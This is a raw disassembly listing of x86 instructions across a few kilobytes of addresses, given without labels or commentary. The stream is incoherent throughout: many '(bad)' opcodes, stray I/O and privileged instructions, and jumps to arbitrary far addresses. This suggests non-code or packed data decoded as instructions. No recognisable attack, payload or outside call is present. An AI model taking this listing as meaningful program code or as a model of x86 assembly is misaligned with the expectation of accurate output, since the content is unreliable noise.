  429f0b:	xchg   esp,eax
  429f0c:	out    0xd0,eax
  429f0e:	popf   
  429f0f:	ret    
  429f10:	iret   
  429f11:	mov    esi,0xe48510d2
  429f16:	adc    DWORD PTR [ebx-0x41],eax
  429f19:	not    BYTE PTR [eax]
  429f1b:	ret    0x9c96
  429f1e:	scas   al,BYTE PTR es:[edi]
  429f1f:	fldenv [edx+0x63]
  429f22:	dec    eax
  429f23:	les    edx,FWORD PTR [esi-0x184fd0ad]
  429f29:	inc    esi
  429f2a:	call   0x785e4542
  429f2f:	mov    ds:0xc5e50d36,eax
  429f34:	xlat   BYTE PTR ds:[ebx]
  429f35:	add    eax,0x46fcdf50
  429f3a:	or     al,0xd9
  429f3c:	ret    0xbf22
  429f3f:	mov    dh,0x6a
  429f41:	mov    bh,0xe4
  429f43:	mov    cl,BYTE PTR [eax+0x6798c03a]
  429f49:	sbb    eax,0x16ee4c29
  429f4e:	(bad)  
  429f4f:	(bad)  
  429f51:	sbb    DWORD PTR [eax+0x336f543c],esi
  429f57:	arpl   WORD PTR [edi-0xcb4c659],si
  429f5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429f5e:	cmp    DWORD PTR [esp+ebx*2],ebp
  429f61:	inc    esp
  429f62:	xor    ch,BYTE PTR [eax-0x64]
  429f65:	sar    bl,cl
  429f67:	retf   0xc6b7
  429f6a:	mov    ds:0xab8e50,eax
	...
  429fd3:	add    BYTE PTR [eax],al
  429fd5:	add    BYTE PTR [ecx],dh
  429fd7:	inc    ebp
  429fd8:	enter  0xfc06,0x8f
  429fdc:	push   DWORD PTR [edi-0x50]
  429fdf:	cld    
  429fe0:	sbb    esp,DWORD PTR [ebx+0x1b3ff4c4]
  429fe6:	addr16 ret 0x1
  429fea:	add    BYTE PTR [ecx],al
  429fec:	add    BYTE PTR [eax],al
  429fee:	mov    dh,0x2b
  429ff0:	call   0x1d71:0xb71ac1db
  429ff7:	jbe    0x42a012
  429ff9:	lea    ebx,[eax+edx*2+0x6a3bbdfc]
  42a000:	push   ds
  42a001:	rol    DWORD PTR [ebp+0x71],1
  42a004:	cmp    eax,0x6d969717
  42a009:	icebp  
  42a00a:	test   BYTE PTR [ebx-0x58],cl
  42a00d:	(bad)  
  42a00e:	and    eax,0x854b3334
  42a013:	rcl    BYTE PTR [edx+0x73],1
  42a016:	fst    DWORD PTR [edi]
  42a018:	xchg   BYTE PTR [edx+0x49],ch
  42a01b:	or     esp,0x23
  42a01e:	lods   al,BYTE PTR ds:[esi]
  42a01f:	addr16 cdq 
  42a021:	in     eax,dx
  42a022:	mov    ah,0xc
  42a024:	mov    ds:0x88a9cac2,al
  42a029:	aad    0x46
  42a02b:	adc    dl,bh
  42a02d:	push   edi
  42a02e:	test   ah,ah
  42a030:	mov    ebx,0x733442fd
  42a035:	xchg   bl,cl
  42a037:	push   esp
  42a038:	test   ch,dh
  42a03a:	adc    eax,0x8391a78e
  42a03f:	jp     0x42a0ab
  42a041:	outs   dx,DWORD PTR ds:[esi]
  42a042:	in     eax,dx
  42a043:	test   DWORD PTR [ebx-0x3e22d8e],ebp
  42a049:	popf   
  42a04a:	dec    ecx
  42a04b:	fidiv  WORD PTR [eax-0x1f6a770d]
  42a051:	jmp    0xdcc7:0xfcbe40b6
  42a058:	sub    DWORD PTR [edi+0x338ba1f],eax
  42a05e:	jecxz  0x42a098
  42a060:	xor    DWORD PTR [esi+0x50],edx
  42a063:	and    cl,ch
  42a065:	sbb    cl,BYTE PTR [ebp+0x3c]
  42a068:	ins    DWORD PTR es:[edi],dx
  42a069:	push   ebp
  42a06a:	test   BYTE PTR ds:0x85510ab0,cl
  42a070:	xor    BYTE PTR [esi],ch
  42a072:	xor    ecx,DWORD PTR [eax]
  42a074:	mov    BYTE PTR [ecx],dh
  42a076:	mov    bh,0xc4
  42a078:	push   cs
  42a079:	hlt    
  42a07a:	pop    esp
  42a07b:	dec    edi
  42a07c:	loopne 0x42a0e0
  42a07e:	lods   eax,DWORD PTR ds:[esi]
  42a07f:	cdq    
  42a080:	out    dx,al
  42a081:	push   cs
  42a082:	sbb    eax,0x930f7b26
  42a087:	push   edi
  42a088:	shl    BYTE PTR [eax-0x51028b50],1
  42a08e:	dec    ebx
  42a08f:	xor    ebp,DWORD PTR [ecx]
  42a091:	mov    esi,0xd70ca15d
  42a096:	jnp    0x42a060
  42a098:	aas    
  42a099:	lahf   
  42a09a:	jmp    0x125c:0x5ef7460a
  42a0a1:	out    dx,al
  42a0a2:	pop    ds
  42a0a3:	push   0x49
  42a0a5:	jmp    0x42a0a1
  42a0a7:	mov    esi,0x5bbb5d03
  42a0ac:	fwait
  42a0ad:	and    cl,BYTE PTR [ebx+0x3684b39f]
  42a0b3:	rol    DWORD PTR [ebp-0x52],1
  42a0b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a0b7:	adc    al,0x5c
  42a0b9:	mov    ah,0xd9
  42a0bb:	mov    bh,0x78
  42a0bd:	push   ds
  42a0be:	pop    DWORD PTR [edx+0x17]
  42a0c1:	sbb    ebx,eax
  42a0c3:	int3   
  42a0c4:	clc    
  42a0c5:	and    DWORD PTR [edi-0x9921b50],0x27
  42a0cc:	lea    eax,[edi+0x6b63fb57]
  42a0d2:	xchg   DWORD PTR [esi-0x12],ebp
  42a0d5:	loop   0x42a0cf
  42a0d7:	(bad)  
  42a0d8:	mov    bl,0xc5
  42a0da:	xchg   ecx,eax
  42a0db:	mov    cl,0x7d
  42a0dd:	das    
  42a0de:	arpl   WORD PTR [eax-0x52f62f4d],cx
  42a0e4:	mov    bh,0x99
  42a0e6:	jae    0x42a15e
  42a0e8:	cdq    
  42a0e9:	jecxz  0x42a097
  42a0eb:	mov    esp,0xfb7c
	...
  42a154:	add    BYTE PTR [eax],al
  42a156:	xlat   BYTE PTR ds:[ebx]
  42a157:	pushf  
  42a158:	shr    BYTE PTR [ebp-0x1000235],0xdb
  42a15f:	call   FWORD PTR [ebx]
  42a161:	(bad)  
  42a162:	mov    eax,0x6783a08a
  42a167:	ret    
  42a168:	add    DWORD PTR [eax],eax
  42a16a:	add    BYTE PTR [ecx],al
  42a16c:	add    BYTE PTR [eax],al
  42a16e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a16f:	or     dh,BYTE PTR [ecx+0x75]
  42a172:	inc    esp
  42a173:	es mov ebp,0xb6e6285b
  42a179:	pop    edi
  42a17a:	adc    ebp,esp
  42a17c:	imul   eax,DWORD PTR [ecx],0x4609dc30
  42a182:	cwde   
  42a183:	gs push ebp
  42a185:	jle    0x42a16d
  42a187:	cmp    ebp,DWORD PTR [esi+0x6b]
  42a18a:	iret   
  42a18b:	dec    ebx
  42a18c:	(bad)  
  42a18d:	mov    al,0xa6
  42a18f:	xor    al,0x7f
  42a191:	mov    BYTE PTR [ebx-0x60],cl
  42a194:	outs   dx,DWORD PTR ds:[esi]
  42a195:	aad    0x8b
  42a197:	jo     0x42a1b3
  42a199:	fs pushf 
  42a19b:	sbb    eax,0x1de12d2c
  42a1a0:	mov    dh,0x1f
  42a1a2:	lods   al,BYTE PTR ds:[esi]
  42a1a3:	repz push 0x29dcdb5
  42a1a9:	mov    edx,0x234f59d7
  42a1ae:	mov    cl,0x45
  42a1b0:	(bad)  
  42a1b1:	or     bh,bh
  42a1b3:	pop    eax
  42a1b4:	or     eax,0xcd399dcb
  42a1b9:	je     0x42a175
  42a1bb:	push   ebp
  42a1bc:	adc    cl,BYTE PTR [edx]
  42a1be:	ror    DWORD PTR [ecx],1
  42a1c0:	not    DWORD PTR [edi+0x27fc425c]
  42a1c6:	add    ebp,ebx
  42a1c8:	mov    dl,0x8
  42a1ca:	push   ss
  42a1cb:	adc    BYTE PTR [esi+0x7],ah
  42a1ce:	sar    eax,1
  42a1d0:	push   0x40
  42a1d2:	mov    dl,0x68
  42a1d4:	pop    edx
  42a1d5:	add    ecx,DWORD PTR [ebx-0x70]
  42a1d8:	lahf   
  42a1d9:	push   ss
  42a1da:	lds    ecx,FWORD PTR [esi]
  42a1dc:	mov    esp,?
  42a1de:	jae    0x42a23a
  42a1e0:	mov    eax,0xfdc41c53
  42a1e5:	mov    BYTE PTR [ecx-0x621d043f],cl
  42a1eb:	inc    edi
  42a1ec:	test   al,0x3
  42a1ee:	jmp    0xa460:0x3c0f5f38
  42a1f5:	or     ebx,DWORD PTR [edx-0x65]
  42a1f8:	lods   eax,DWORD PTR ds:[esi]
  42a1f9:	inc    esi
  42a1fa:	mov    al,ds:0xd232fc6b
  42a1ff:	inc    edx
  42a200:	mov    al,0x56
  42a202:	or     edi,DWORD PTR [esi-0x323ff234]
  42a208:	xchg   DWORD PTR [ebx-0x3793153e],eax
  42a20e:	xlat   BYTE PTR ds:[ebx]
  42a20f:	in     al,0xb3
  42a211:	(bad)  
  42a213:	jecxz  0x42a23e
  42a215:	and    eax,0xb6dfe34b
  42a21b:	inc    ebx
  42a21c:	icebp  
  42a21d:	arpl   WORD PTR [esi+0x42],sp
  42a220:	stc    
  42a221:	into   
  42a222:	aam    0xd
  42a224:	inc    ebp
  42a225:	(bad)  
  42a226:	in     eax,dx
  42a227:	jl     0x42a250
  42a229:	nop
  42a22a:	jle    0x42a207
  42a22c:	lods   al,BYTE PTR ds:[esi]
  42a22d:	sbb    ebp,esi
  42a22f:	xchg   esp,eax
  42a230:	dec    esp
  42a231:	jmp    0x89e0:0x6c47397a
  42a238:	or     cl,0x49
  42a23b:	push   ebp
  42a23c:	stos   DWORD PTR es:[edi],eax
  42a23d:	sbb    cl,BYTE PTR [esi+0x48e96fda]
  42a243:	mov    dh,0x55
  42a245:	jno    0x42a23b
  42a247:	jecxz  0x42a22c
  42a249:	pop    esi
  42a24a:	out    0xf9,eax
  42a24c:	es call 0x787d0d7e
  42a252:	jb     0x42a2b6
  42a254:	inc    ebp
  42a255:	loopne 0x42a2c8
  42a257:	dec    ebx
  42a258:	cmp    DWORD PTR [esi],esi
  42a25a:	mov    al,0x33
  42a25c:	mov    al,0x54
  42a25e:	cld    
  42a25f:	shl    BYTE PTR [ebx],cl
  42a261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a262:	add    bh,BYTE PTR [ebp+0x89967ab]
  42a268:	sub    DWORD PTR [ecx-0x2a],edi
  42a26b:	ss mov edi,0xec
	...
  42a2d5:	add    BYTE PTR [ebx],ch
  42a2d7:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a2dd:	mov    bh,0x1a
  42a2df:	aas    
  42a2e0:	scas   al,BYTE PTR es:[edi]
  42a2e1:	fnstenv [ecx]
  42a2e3:	(bad)  
  42a2e4:	shl    BYTE PTR [esi+0x1c467],cl
  42a2ea:	add    BYTE PTR [ecx],al
  42a2ec:	add    BYTE PTR [eax],al
  42a2ee:	popf   
  42a2ef:	lods   al,BYTE PTR ds:[esi]
  42a2f0:	ins    BYTE PTR es:[edi],dx
  42a2f1:	jmp    DWORD PTR [esi]
  42a2f3:	test   DWORD PTR [edx-0x7d890bce],ecx
  42a2f9:	and    eax,0x715f320e
  42a2fe:	xlat   BYTE PTR ds:[ebx]
  42a2ff:	test   BYTE PTR [esi],ah
  42a301:	mov    cl,0xa5
  42a303:	xor    DWORD PTR [ebx],0xbc72defc
  42a309:	outs   dx,DWORD PTR ds:[esi]
  42a30a:	test   eax,0x67122069
  42a30f:	jl     0x42a321
  42a311:	mov    ebp,0x173e19a7
  42a316:	mov    ch,0x6c
  42a318:	or     DWORD PTR [ebp+0x723a232a],ecx
  42a31e:	mul    eax
  42a320:	xchg   edi,eax
  42a321:	mov    ecx,0x60589e1d
  42a326:	inc    esp
  42a327:	adc    BYTE PTR [ebp+ebx*2+0x22],0xe9
  42a32c:	adc    BYTE PTR [ebp+0x14f6a421],0x51
  42a333:	lods   eax,DWORD PTR ds:[esi]
  42a334:	cmc    
  42a335:	cmp    al,0x38
  42a337:	cmp    BYTE PTR [ebx+0x47],0x4b
  42a33b:	xlat   BYTE PTR ds:[ebx]
  42a33c:	jecxz  0x42a2d6
  42a33e:	and    eax,0x2449c1f9
  42a343:	lods   al,BYTE PTR ds:[esi]
  42a344:	mov    ecx,0xb43e6161
  42a349:	push   0xffffffb1
  42a34b:	xor    al,0x5e
  42a34d:	push   cs
  42a34e:	popa   
  42a34f:	or     DWORD PTR [esi+0x7c5d5b2b],ecx
  42a355:	add    DWORD PTR ds:0xb7c37d81,0x4a995ee3
  42a35f:	xor    ecx,DWORD PTR [edi+0x9a591d]
  42a365:	icebp  
  42a366:	adc    BYTE PTR [edx+0xf],bl
  42a369:	or     DWORD PTR [ecx],0xe566d40f
  42a36f:	jno    0x42a302
  42a371:	xchg   ebp,eax
  42a372:	push   0xffffff8e
  42a374:	sbb    ebx,DWORD PTR [esi+0x46121974]
  42a37a:	icebp  
  42a37b:	xchg   ebx,eax
  42a37c:	xchg   DWORD PTR [ecx],edx
  42a37e:	ror    DWORD PTR [edi-0x49],0x86
  42a382:	(bad)  [eax+0x50]
  42a385:	push   ss
  42a386:	jmp    0x84b9:0x9ab8ef02
  42a38d:	jge    0x42a365
  42a38f:	mov    DWORD PTR [eax],edx
  42a391:	das    
  42a392:	jl     0x42a3d4
  42a394:	scas   eax,DWORD PTR es:[edi]
  42a395:	push   edi
  42a396:	sub    cl,BYTE PTR [ebp+0xbe19df2]
  42a39c:	(bad)  
  42a39d:	je     0x42a396
  42a39f:	fldcw  WORD PTR [edx+0x2b]
  42a3a2:	imul   esp,ebp,0x878eca5a
  42a3a8:	hlt    
  42a3a9:	es jl  0x42a337
  42a3ac:	sar    DWORD PTR [ebx],0x72
  42a3af:	lock mov eax,DWORD PTR [ecx+0x26]
  42a3b3:	jbe    0x42a35b
  42a3b5:	gs jge 0x42a3ea
  42a3b8:	sub    DWORD PTR [ecx+esi*4-0xb],0x4c
  42a3bd:	ror    BYTE PTR [esp+edx*1-0xd1795ad],0xd
  42a3c5:	pop    edx
  42a3c6:	mov    ah,ch
  42a3c8:	stos   BYTE PTR es:[edi],al
  42a3c9:	in     al,dx
  42a3ca:	aas    
  42a3cb:	pop    es
  42a3cc:	fwait
  42a3cd:	test   BYTE PTR [ecx+0x32],bl
  42a3d0:	out    dx,eax
  42a3d1:	adc    BYTE PTR [ecx+0x25],al
  42a3d4:	dec    edx
  42a3d5:	sub    dl,BYTE PTR [esi+0x1e2ccc8e]
  42a3db:	sbb    DWORD PTR [ebx+0x1c],edx
  42a3de:	xchg   edi,eax
  42a3df:	inc    esp
  42a3e0:	jp     0x42a454
  42a3e2:	sub    ebp,DWORD PTR [edx+0x5dce83c3]
  42a3e8:	sub    al,0xb8
  42a3ea:	or     BYTE PTR [ebx+esi*1-0x79],al
	...
  42a456:	jg     0x42a466
  42a458:	jne    0x42a495
  42a45a:	jne    0x42a4d7
  42a45c:	jg     0x42a4ac
  42a45e:	loop   0x42a4c9
  42a460:	mov    ebp,0x517c763d
  42a465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a466:	lds    eax,FWORD PTR [bx+di]
  42a469:	add    BYTE PTR [eax],al
  42a46b:	add    DWORD PTR [eax],eax
  42a46d:	add    BYTE PTR [esi],dl
  42a46f:	int3   
  42a470:	mov    dl,ch
  42a472:	adc    al,0x98
  42a474:	in     eax,0x7c
  42a476:	xor    al,0x25
  42a478:	sbb    bl,bh
  42a47a:	std    
  42a47b:	sbb    esp,edi
  42a47d:	xchg   ebp,eax
  42a47e:	cld    
  42a47f:	jmp    0x43bf:0xa3c341af
  42a486:	pop    eax
  42a487:	aam    0x3a
  42a489:	xor    DWORD PTR ds:0xc01694c5,edi
  42a48f:	fmul   DWORD PTR [edx+0x1c]
  42a492:	or     ebp,ecx
  42a494:	popf   
  42a495:	cmp    DWORD PTR [edi-0x43],ebp
  42a498:	shr    DWORD PTR ds:[eax-0x662892e0],cl
  42a49f:	fadd   QWORD PTR [ecx]
  42a4a1:	inc    ebx
  42a4a2:	and    BYTE PTR [edi+0x29],0x6
  42a4a6:	lea    ebp,[esi+0x6]
  42a4a9:	sub    eax,0x9a69dc0a
  42a4ae:	xor    DWORD PTR [eax-0x31],esp
  42a4b1:	add    DWORD PTR [edx-0xe90ffa5],0x544c3fc5
  42a4bb:	pop    es
  42a4bc:	stos   BYTE PTR es:[edi],al
  42a4bd:	or     BYTE PTR [esi-0x6c14b70f],al
  42a4c3:	push   ss
  42a4c4:	jmp    0x42a48f
  42a4c6:	dec    ecx
  42a4c7:	stos   BYTE PTR es:[edi],al
  42a4c8:	jmp    DWORD PTR [ebx-0x6b]
  42a4cb:	and    al,0xbf
  42a4cd:	jmp    0x42a46a
  42a4cf:	pop    eax
  42a4d0:	dec    ebx
  42a4d1:	jno    0x42a54c
  42a4d3:	outs   dx,DWORD PTR ds:[esi]
  42a4d4:	inc    eax
  42a4d5:	cs mov esp,0xc8925c7f
  42a4db:	or     DWORD PTR [ebp+0x66],esi
  42a4de:	pop    ds
  42a4df:	sub    edx,DWORD PTR [edi+0x59]
  42a4e2:	sub    al,0x84
  42a4e4:	lods   eax,DWORD PTR ds:[esi]
  42a4e5:	jecxz  0x42a51b
  42a4e7:	fst    st(1)
  42a4e9:	das    
  42a4ea:	cli    
  42a4eb:	fstp   TBYTE PTR [edi-0x40c5de4a]
  42a4f1:	push   es
  42a4f2:	adc    esp,DWORD PTR [eax]
  42a4f4:	mov    eax,ds:0xf4557be5
  42a4f9:	jo     0x42a55f
  42a4fb:	mov    ecx,0xe659b029
  42a500:	out    0xa8,al
  42a502:	leave  
  42a503:	cli    
  42a504:	aad    0xe4
  42a506:	mov    bh,0x57
  42a508:	lds    ebp,FWORD PTR [ecx+ebx*1+0x53349afb]
  42a50f:	or     DWORD PTR [ebx],esp
  42a511:	or     ecx,DWORD PTR [esi]
  42a513:	push   edi
  42a514:	inc    edx
  42a515:	les    edx,FWORD PTR [esi-0x4d]
  42a518:	mov    edi,0x6ea67b6e
  42a51d:	(bad)  
  42a51e:	xor    al,al
  42a520:	jns    0x42a569
  42a522:	clc    
  42a523:	push   ebx
  42a524:	in     eax,0x23
  42a526:	mov    ds:0x68813545,eax
  42a52b:	add    ch,bl
  42a52d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a52e:	retf   0x1b57
  42a531:	and    al,BYTE PTR gs:[ebp-0x80]
  42a535:	rcl    BYTE PTR [esi-0x51],cl
  42a538:	sbb    ecx,DWORD PTR [ebx-0x73073bbb]
  42a53e:	aaa    
  42a53f:	lock mov al,0xa4
  42a542:	jle    0x42a4fb
  42a544:	cs retf 0xdf31
  42a548:	mul    BYTE PTR [edi-0x3dd2dd5e]
  42a54e:	cmc    
  42a54f:	in     al,dx
  42a550:	xor    BYTE PTR [ebp-0x29],bh
  42a553:	aad    0x76
  42a555:	int    0x43
  42a557:	test   al,0x55
  42a559:	push   esi
  42a55a:	in     al,0x8b
  42a55c:	and    esi,ebx
  42a55e:	ret    
  42a55f:	cwde   
  42a560:	dec    ah
  42a562:	jns    0x42a5c4
  42a564:	scas   eax,DWORD PTR es:[edi]
  42a565:	mov    al,0x6a
  42a567:	jecxz  0x42a572
  42a569:	push   edi
  42a56a:	push   0x77
  42a56c:	sub    ch,BYTE PTR [ebx]
	...
  42a5d6:	sbb    BYTE PTR [edi+0x17],cl
  42a5d9:	mov    ecx,0xefbef957
  42a5de:	(bad)  
  42a5df:	cmc    
  42a5e0:	mov    edx,0x6d3c389f
  42a5e5:	mov    BYTE PTR [edi-0x3a],ah
  42a5e8:	add    DWORD PTR [eax],eax
  42a5ea:	add    BYTE PTR [ecx],al
  42a5ec:	add    BYTE PTR [eax],al
  42a5ee:	sub    DWORD PTR [ecx],ebp
  42a5f0:	mov    ds:0xebd282a1,al
  42a5f5:	and    ah,BYTE PTR gs:[edx]
  42a5f8:	sub    eax,esp
  42a5fa:	call   0x29bce096
  42a5ff:	pop    ds
  42a600:	mov    eax,0x34bd2a2c
  42a605:	stos   BYTE PTR es:[edi],al
  42a606:	push   cs
  42a607:	popa   
  42a608:	xchg   edi,eax
  42a609:	icebp  
  42a60a:	adc    DWORD PTR [eax+0x33f5db0c],esp
  42a610:	stc    
  42a611:	in     eax,dx
  42a612:	add    BYTE PTR ds:0xffbe191d,0x4a
  42a619:	dec    edx
  42a61a:	iret   
  42a61b:	popa   
  42a61c:	dec    edi
  42a61d:	test   DWORD PTR [ebp+0x44],0x2bedff06
  42a624:	adc    eax,0xdab097cb
  42a629:	scas   al,BYTE PTR es:[edi]
  42a62a:	or     al,0x7d
  42a62c:	shl    DWORD PTR [ebp+0x66ab952d],cl
  42a632:	test   edx,esp
  42a634:	dec    esi
  42a635:	call   0x641df5a1
  42a63a:	scas   al,BYTE PTR es:[edi]
  42a63b:	sub    eax,0x2de4e10c
  42a640:	dec    esp
  42a641:	imul   cl
  42a643:	sbb    cl,bl
  42a645:	mov    ecx,0xd55720d8
  42a64a:	jl     0x42a66a
  42a64c:	fdivp  st(1),st
  42a64e:	xchg   bl,bl
  42a650:	aaa    
  42a651:	in     eax,0x8f
  42a653:	cli    
  42a654:	out    0xac,eax
  42a656:	bound  edx,QWORD PTR [edi+0x532752a9]
  42a65c:	je     0x42a665
  42a65e:	mov    bl,0x21
  42a660:	test   DWORD PTR [edi+0x3952f952],esi
  42a666:	in     al,0xf3
  42a668:	stc    
  42a669:	es sbb eax,0x7bcc520f
  42a66f:	or     DWORD PTR [ecx+0x714db61f],ebp
  42a675:	(bad)  
  42a677:	mov    esi,0x1f82a5d0
  42a67c:	xor    BYTE PTR [ebx+0x5f],dh
  42a67f:	and    al,0xb6
  42a681:	push   ebp
  42a682:	repz add al,0x5d
  42a685:	lea    ebp,[edx+0x68]
  42a688:	xor    al,0x25
  42a68a:	dec    eax
  42a68b:	test   al,ah
  42a68d:	adc    eax,0x188cd2bc
  42a692:	push   edi
  42a693:	sub    ecx,DWORD PTR [edx]
  42a695:	xchg   edx,eax
  42a696:	popa   
  42a697:	leave  
  42a698:	shl    DWORD PTR [eax+0x532b9b1d],0x1b
  42a69f:	mov    edx,0xbb2174f8
  42a6a4:	fld    DWORD PTR [eax+0x6f1fa9c3]
  42a6aa:	pop    ecx
  42a6ab:	pop    ebp
  42a6ac:	jno    0x42a635
  42a6ae:	ja     0x42a66c
  42a6b0:	int3   
  42a6b1:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a6b3:	retf   
  42a6b4:	dec    DWORD PTR [esi+0x72dd8d42]
  42a6ba:	(bad)  
  42a6bb:	cmp    BYTE PTR [ebp-0x68],bl
  42a6be:	adc    ebx,DWORD PTR [esi]
  42a6c0:	add    DWORD PTR [esi],0xa3b612d6
  42a6c6:	dec    eax
  42a6c7:	mov    eax,0x50dd8edd
  42a6cc:	test   BYTE PTR [edx+eiz*8+0x2b9e3e9c],al
  42a6d3:	mov    bl,BYTE PTR ds:0xc4d9baa6
  42a6d9:	test   BYTE PTR [ecx+0x45],dl
  42a6dc:	pop    dx
  42a6de:	out    dx,al
  42a6df:	(bad)  
  42a6e0:	cld    
  42a6e1:	jecxz  0x42a6dd
  42a6e3:	lea    esi,[ebx+0x76f0e3e]
  42a6e9:	(bad)  
  42a6ea:	loop   0x42a73a
  42a6ec:	xor    al,0x7
	...
  42a756:	and    al,0x16
  42a758:	outs   dx,BYTE PTR ds:[esi]
  42a759:	(bad)  
  42a75a:	jle    0x42a75b
  42a75c:	lods   eax,DWORD PTR ds:[esi]
  42a75d:	test   DWORD PTR [edi+0xbb8131c],0x67ae61ce
  42a767:	mov    DWORD PTR [ecx],0x10000
  42a76d:	add    BYTE PTR [ecx+0x38a99c96],bl
  42a773:	xor    BYTE PTR [ecx+0x70874821],dh
  42a779:	dec    ecx
  42a77a:	shr    BYTE PTR [eax],cl
  42a77c:	jne    0x42a772
  42a77e:	add    dh,ch
  42a780:	cmp    DWORD PTR [ebx-0x3a7cabfb],edx
  42a786:	and    al,0xec
  42a788:	adc    al,0xa7
  42a78a:	mov    ds:0x3cf82b1d,eax
  42a78f:	cs scas al,BYTE PTR es:[edi]
  42a791:	pop    edx
  42a792:	clc    
  42a793:	in     eax,0xc7
  42a795:	mov    edi,0x809b25f
  42a79a:	mov    WORD PTR [ecx],es
  42a79c:	cmp    ah,0x92
  42a79f:	jns    0x42a7f9
  42a7a1:	aaa    
  42a7a2:	call   0xc023:0x2047fc99
  42a7a9:	adc    edi,DWORD PTR [ecx-0x596a0c65]
  42a7af:	jmp    FWORD PTR [ebx+0x2e]
  42a7b2:	push   edi
  42a7b3:	dec    esp
  42a7b4:	lock enter 0x2121,0x21
  42a7b9:	or     cl,dh
  42a7bb:	xchg   esp,eax
  42a7bc:	(bad)  
  42a7bd:	sahf   
  42a7be:	sahf   
  42a7bf:	scas   al,BYTE PTR es:[edi]
  42a7c0:	nop
  42a7c1:	retf   
  42a7c2:	retf   
  42a7c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a7c4:	pop    esp
  42a7c5:	inc    edx
  42a7c6:	push   esp
  42a7c7:	scas   eax,DWORD PTR es:[edi]
  42a7c8:	loopne 0x42a759
  42a7ca:	or     DWORD PTR [edi-0x17],eax
  42a7cd:	adc    eax,0xf44a894b
  42a7d2:	call   0x4d43:0x3ea30af5
  42a7d9:	(bad)  
  42a7da:	pop    ebp
  42a7db:	push   0xfffffff8
  42a7dd:	jl     0x42a7e3
  42a7df:	ds xchg esi,eax
  42a7e1:	sbb    DWORD PTR [eax-0x16da054c],ebp
  42a7e7:	iret   
  42a7e8:	shl    ebx,cl
  42a7ea:	test   al,0xa7
  42a7ec:	mov    esp,0x574b04f3
  42a7f1:	in     eax,0xae
  42a7f3:	in     eax,0x32
  42a7f5:	outs   dx,BYTE PTR ds:[esi]
  42a7f6:	mov    ecx,0xa8182a27
  42a7fb:	aam    0x4
  42a7fd:	cmp    al,bh
  42a7ff:	and    DWORD PTR [eax+0x406c2232],ebp
  42a805:	outs   dx,DWORD PTR ds:[esi]
  42a806:	dec    ecx
  42a807:	sti    
  42a808:	test   edi,ebp
  42a80a:	xchg   ecx,eax
  42a80b:	sub    ebp,DWORD PTR [edx]
  42a80d:	pop    edi
  42a80e:	mov    edx,0x32255762
  42a813:	mov    ebx,0xa6d19c7d
  42a818:	out    0xb5,eax
  42a81a:	xchg   esp,eax
  42a81b:	xlat   BYTE PTR ds:[ebx]
  42a81c:	lds    ebp,FWORD PTR [esp+ebp*4-0x10fe1311]
  42a823:	shl    BYTE PTR [esi-0x36583ba],0xf2
  42a82a:	sub    ebx,DWORD PTR ds:0x79f34051
  42a830:	push   ebx
  42a831:	cmp    eax,DWORD PTR [eax+ecx*8+0xfa54e96]
  42a838:	mov    ebx,0x95cd23b2
  42a83d:	mov    ebx,0xb755578e
  42a842:	outs   dx,BYTE PTR ds:[esi]
  42a843:	fs push 0xffffffbe
  42a846:	lods   eax,DWORD PTR ds:[esi]
  42a847:	add    al,0x90
  42a849:	add    bh,BYTE PTR [ebx-0x46]
  42a84c:	jecxz  0x42a805
  42a84e:	jno    0x42a84e
  42a850:	outs   dx,DWORD PTR ds:[esi]
  42a851:	shl    BYTE PTR [edx-0x47],cl
  42a854:	mov    WORD PTR [edi],ss
  42a856:	jg     0x42a8d0
  42a858:	std    
  42a859:	or     esp,ebp
  42a85b:	fimul  DWORD PTR [ecx]
  42a85d:	mov    DWORD PTR [ebp+0x2ab8fb8b],eax
  42a863:	dec    ebp
  42a864:	lock test BYTE PTR [esi+0x2f],dh
  42a868:	lods   eax,DWORD PTR ds:[esi]
  42a869:	adc    DWORD PTR [edi+0x18a84c],esi
	...
  42a8d3:	add    BYTE PTR [eax],al
  42a8d5:	add    BYTE PTR [edx-0x10409c9b],cl
  42a8db:	mov    edi,0xc58175de
  42a8e0:	xchg   edi,eax
  42a8e1:	ins    BYTE PTR es:[edi],dx
  42a8e2:	stc    
  42a8e3:	mov    dh,0x72
  42a8e5:	daa    
  42a8e6:	addr16 enter 0x1,0x0
  42a8eb:	add    DWORD PTR [eax],eax
  42a8ed:	add    al,bl
  42a8ef:	gs dec ecx
  42a8f1:	or     eax,0xaf0d5992
  42a8f6:	out    0xf4,al
  42a8f8:	adc    BYTE PTR [ebp+0x32],bh
  42a8fb:	inc    ebx
  42a8fc:	or     al,0xfd
  42a8fe:	in     eax,0x51
  42a900:	(bad)  
  42a901:	push   edi
  42a902:	xabort 0xd3
  42a905:	sbb    al,0x8c
  42a907:	adc    DWORD PTR [edi],esp
  42a909:	lods   al,BYTE PTR ds:[esi]
  42a90a:	bound  eax,QWORD PTR [eax-0x56]
  42a90d:	pop    eax
  42a90e:	jp     0x42a955
  42a910:	pop    edx
  42a911:	and    ch,ch
  42a913:	int    0x8c
  42a915:	inc    edx
  42a916:	cmp    esp,DWORD PTR [ecx+0x62]
  42a919:	or     eax,0x3b983401
  42a91e:	test   BYTE PTR [ecx],cl
  42a920:	icebp  
  42a921:	sbb    al,0x5b
  42a923:	pushw  ss
  42a925:	nop
  42a926:	nop
  42a927:	sbb    al,0x5e
  42a929:	push   ds
  42a92a:	test   al,0xc3
  42a92c:	or     eax,0xad2fddc0
  42a931:	push   ebp
  42a932:	xor    BYTE PTR [ebx],dl
  42a934:	repnz (bad) [ebx]
  42a937:	and    al,0x6e
  42a939:	jae    0x42a999
  42a93b:	adc    DWORD PTR [edi-0x7ec37f7d],ecx
  42a941:	sub    BYTE PTR [edi+0x793c915a],ah
  42a947:	loope  0x42a91a
  42a949:	mov    edi,0x68007b05
  42a94e:	das    
  42a94f:	(bad)  
  42a950:	ss out dx,al
  42a952:	pop    ds
  42a953:	clc    
  42a954:	pop    ebx
  42a955:	jg     0x42a9c7
  42a957:	xor    dl,dl
  42a959:	lea    edx,gs:[edi+0x5a4725fc]
  42a960:	pushf  
